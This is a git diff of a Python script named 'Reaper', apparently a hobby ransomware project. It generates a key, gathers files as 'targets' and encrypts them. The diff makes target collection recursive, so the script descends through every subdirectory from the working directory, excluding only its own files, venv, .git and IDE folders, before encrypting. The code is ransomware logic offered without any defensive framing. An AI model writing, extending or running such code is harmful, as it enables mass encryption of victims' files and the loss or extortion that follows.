@@ -14,15 +14,20 @@ def generate_key():
 class Reaper:
     targets = []
 
-    def gather_targets(self):
-        for file in os.listdir():
-            if file == "Reaper.py" or file == "key.key" or file == "Saviour.py":
+    def gather_targets(self, path=os.getcwd()):
+        for file in os.scandir(path):
+            name = file.path.split("\\")[-1]
+
+            if name == "Reaper.py" or name == "key.key" or name == "Saviour.py":
                 continue
 
-            if os.path.isdir(file):
-                continue
+            if file.is_dir():
+                if name == "venv" or name == ".git" or name == "inspectionProfiles" or name == ".idea":
+                    continue
+                self.gather_targets(file)
 
-            self.targets.append(file)
+            else:
+                self.targets.append(file.path)
 
     def encrypt(self, key):
         for file in self.targets:
@@ -38,8 +43,11 @@ class Reaper:
     def start(self):
         print("Generating key...")
         key = generate_key()
+
         print("Locating targets...")
         self.gather_targets()
+        print(self.targets)
+
         print("Encrypting files...")
         self.encrypt(key)
 
